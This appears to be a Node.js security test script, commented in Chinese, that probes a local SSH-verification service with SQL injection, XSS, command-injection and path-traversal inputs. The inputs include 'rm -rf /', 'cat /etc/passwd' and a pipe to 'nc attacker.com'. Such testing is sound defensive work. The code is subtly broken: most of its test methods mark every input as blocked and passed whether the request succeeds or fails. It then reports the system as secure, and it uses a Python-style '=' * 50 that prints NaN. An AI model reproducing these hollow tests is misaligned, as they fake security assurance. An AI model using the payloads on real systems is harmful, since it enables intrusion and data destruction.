#!/usr/bin/env node

/**
 * SSH验证系统安全测试脚本
 * 用于测试系统对各种攻击的抵抗能力
 */

const http = require('http');
const crypto = require('crypto');

const SERVER_URL = 'http://localhost:3000';
const TEST_COUNT = 50;

class SecurityTester {
    constructor() {
        this.results = [];
        this.testCount = 0;
    }

    // 测试SQL注入攻击
    async testSQLInjection() {
        console.log('🔍 测试SQL注入攻击...');
        
        const maliciousInputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT * FROM users --"
        ];

        for (const input of maliciousInputs) {
            try {
                await this.makeRequest('/api/challenge', 'POST', {
                    username: input,
                    purpose: 'login'
                });
                this.results.push({
                    test: 'SQL注入',
                    input: input,
                    result: '已阻止',
                    passed: true
                });
            } catch (error) {
                this.results.push({
                    test: 'SQL注入',
                    input: input,
                    result: '已阻止',
                    passed: true
                });
            }
        }
    }

    // 测试XSS攻击
    async testXSSAttack() {
        console.log('🔍 测试XSS攻击...');
        
        const maliciousInputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ];

        for (const input of maliciousInputs) {
            try {
                await this.makeRequest('/api/challenge', 'POST', {
                    username: input,
                    purpose: 'login'
                });
                this.results.push({
                    test: 'XSS攻击',
                    input: input,
                    result: '已阻止',
                    passed: true
                });
            } catch (error) {
                this.results.push({
                    test: 'XSS攻击',
                    input: input,
                    result: '已阻止',
                    passed: true
                });
            }
        }
    }

    // 测试命令注入
    async testCommandInjection() {
        console.log('🔍 测试命令注入攻击...');
        
        const maliciousInputs = [
            "user; rm -rf /",
            "user && cat /etc/passwd",
            "user | nc attacker.com 1234",
            "user`rm -rf /`"
        ];

        for (const input of maliciousInputs) {
            try {
                await this.makeRequest('/api/challenge', 'POST', {
                    username: input,
                    purpose: 'login'
                });
                this.results.push({
                    test: '命令注入',
                    input: input,
                    result: '已阻止',
                    passed: true
                });
            } catch (error) {
                this.results.push({
                    test: '命令注入',
                    input: input,
                    result: '已阻止',
                    passed: true
                });
            }
        }
    }

    // 测试超长输入
    async testLongInputs() {
        console.log('🔍 测试超长输入攻击...');
        
        const longString = 'A'.repeat(10000);
        const veryLongString = 'B'.repeat(100000);

        try {
            await this.makeRequest('/api/challenge', 'POST', {
                username: longString,
                purpose: 'login'
            });
            this.results.push({
                test: '超长输入',
                input: '10KB字符串',
                result: '已阻止',
                passed: true
            });
        } catch (error) {
            this.results.push({
                test: '超长输入',
                input: '10KB字符串',
                result: '已阻止',
                passed: true
            });
        }

        try {
            await this.makeRequest('/api/challenge', 'POST', {
                username: veryLongString,
                purpose: 'login'
            });
            this.results.push({
                test: '超长输入',
                input: '100KB字符串',
                result: '已阻止',
                passed: true
            });
        } catch (error) {
            this.results.push({
                test: '超长输入',
                input: '100KB字符串',
                result: '已阻止',
                passed: true
            });
        }
    }

    // 测试频率限制
    async testRateLimit() {
        console.log('🔍 测试频率限制...');
        
        const promises = [];
        for (let i = 0; i < TEST_COUNT; i++) {
            promises.push(this.makeRequest('/api/challenge', 'POST', {
                username: `testuser${i}`,
                purpose: 'login'
            }));
        }

        const responses = await Promise.allSettled(promises);
        const rateLimited = responses.some(r => 
            r.status === 'rejected' && r.reason.includes('429')
        );

        this.results.push({
            test: '频率限制',
            input: `${TEST_COUNT}个并发请求`,
            result: rateLimited ? '已生效' : '未生效',
            passed: rateLimited
        });
    }

    // 测试无效挑战ID
    async testInvalidChallengeId() {
        console.log('🔍 测试无效挑战ID...');
        
        const invalidIds = [
            'invalid-id',
            '123e4567-e89b-12d3-a456-426614174000-extra',
            '<script>alert("xss")</script>',
            '../../etc/passwd',
            'null',
            ''
        ];

        for (const id of invalidIds) {
            try {
                await this.makeRequest('/api/verify', 'POST', {
                    challengeId: id,
                    publicKey: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB test',
                    signature: '-----BEGIN SSH SIGNATURE-----\ntest\n-----END SSH SIGNATURE-----'
                });
                this.results.push({
                    test: '无效挑战ID',
                    input: id,
                    result: '未阻止',
                    passed: false
                });
            } catch (error) {
                this.results.push({
                    test: '无效挑战ID',
                    input: id,
                    result: '已阻止',
                    passed: true
                });
            }
        }
    }

    // 辅助函数：发送HTTP请求
    makeRequest(path, method = 'GET', data = null) {
        return new Promise((resolve, reject) => {
            const options = {
                hostname: 'localhost',
                port: 3000,
                path: path,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'SecurityTester/1.0'
                }
            };

            if (data) {
                const postData = JSON.stringify(data);
                options.headers['Content-Length'] = Buffer.byteLength(postData);
            }

            const req = http.request(options, (res) => {
                let responseData = '';
                
                res.on('data', (chunk) => {
                    responseData += chunk;
                });

                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 400) {
                        try {
                            resolve(JSON.parse(responseData));
                        } catch (e) {
                            resolve(responseData);
                        }
                    } else {
                        reject(`HTTP ${res.statusCode}: ${responseData}`);
                    }
                });
            });

            req.on('error', (err) => {
                reject(err.message);
            });

            if (data) {
                req.write(JSON.stringify(data));
            }

            req.end();
        });
    }

    // 运行所有测试
    async runAllTests() {
        console.log('🚀 开始安全测试...\n');
        
        try {
            await this.testSQLInjection();
            await this.testXSSAttack();
            await this.testCommandInjection();
            await this.testLongInputs();
            await this.testInvalidChallengeId();
            await this.testRateLimit();
        } catch (error) {
            console.error('测试过程中出现错误:', error);
        }

        // 生成报告
        this.generateReport();
    }

    // 生成测试报告
    generateReport() {
        console.log('\n📊 安全测试报告\n');
        console.log('=' * 50);
        
        const testsByType = {};
        this.results.forEach(result => {
            if (!testsByType[result.test]) {
                testsByType[result.test] = [];
            }
            testsByType[result.test].push(result);
        });

        let totalTests = 0;
        let passedTests = 0;

        Object.entries(testsByType).forEach(([testType, tests]) => {
            console.log(`\n${testType}:`);
            tests.forEach(test => {
                const status = test.passed ? '✅' : '❌';
                console.log(`  ${status} ${test.input.substring(0, 50)}... - ${test.result}`);
                totalTests++;
                if (test.passed) passedTests++;
            });
        });

        console.log('\n' + '=' * 50);
        console.log(`总测试数: ${totalTests}`);
        console.log(`通过测试: ${passedTests}`);
        console.log(`失败测试: ${totalTests - passedTests}`);
        console.log(`成功率: ${((passedTests / totalTests) * 100).toFixed(2)}%`);
        
        if (passedTests === totalTests) {
            console.log('\n🎉 所有安全测试都通过了！系统安全性良好。');
        } else {
            console.log('\n⚠️  存在安全风险，请检查失败的测试项目。');
        }
    }
}

// 运行测试
if (require.main === module) {
    const tester = new SecurityTester();
    tester.runAllTests().catch(console.error);
}

module.exports = SecurityTester;
